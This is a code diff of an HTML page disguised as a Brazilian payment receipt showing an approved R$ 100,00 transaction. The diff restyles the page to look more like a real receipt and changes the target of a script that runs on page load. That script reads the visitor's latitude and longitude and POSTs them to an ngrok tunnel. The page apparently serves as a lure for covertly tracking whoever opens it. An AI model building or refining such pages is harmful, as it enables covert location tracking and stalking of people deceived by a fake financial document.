@@ -2,11 +2,60 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
+  <meta name = "viewport" content="width=device-width, initial-scale=1.0">
   <title>Comprovante</title>
-</head>
-<body style="background-color: antiquewhite;">
-  <h1>Comprovante</h1>
+  <style>
+    body{
+      font-family: 'Courier New', Courier, monospace;
+      background-color: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .receipt{
+      background: white;
+      padding: 20px;
+      width: 300px;
+      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+      border-radius: 5px;
+      border-top: 5px dashed black;
+      border-bottom: 5px dashed black;
+      text-align: center;
+    }
+    .receipt h1 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+    .details {
+      text-align: left;
+      font-size: 14px;
+      line-height: 1.5;
+      border-top: 1px dashed black;
+      padding-top: 10px;
+      margin-top: 10px;
+    }
 
+    .footer{
+      border-top: 1px dashed black;
+      padding-top: 10px;
+      font-size: 12px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="receipt">
+  <h1>Comprovante de Transação</h1>
+  <p>Data: <span id="date"></span></p>
+  <div class="details">
+    <p><strong>Valor:</strong> R$ 100,00</p>
+    <p><strong>Transação:</strong> Aprovada</p>
+
+  </div>
+  </div>
+    
   <script>
     // Executa automaticamente ao carregar a página
     window.addEventListener("load", () => {
@@ -25,7 +74,7 @@
       console.log("Longitude: " + longitude);
 
       // Envia a localização para o backend
-      fetch("https://55c7-187-19-219-30.ngrok-free.app/send-location", {
+      fetch(" https://8dbb-187-19-219-30.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
